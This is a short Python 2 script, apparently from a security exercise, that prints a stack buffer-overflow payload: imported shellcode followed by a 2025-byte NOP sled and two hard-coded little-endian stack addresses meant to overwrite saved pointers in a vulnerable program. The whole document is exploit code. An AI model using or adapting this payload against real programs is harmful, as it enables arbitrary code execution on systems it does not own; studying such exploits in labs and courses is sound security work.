from struct import pack
from shellcode import shellcode
print shellcode + '\x90'*2025 + pack("<I", 0xbffeae98) + pack("<I", 0xbffeb6ac)

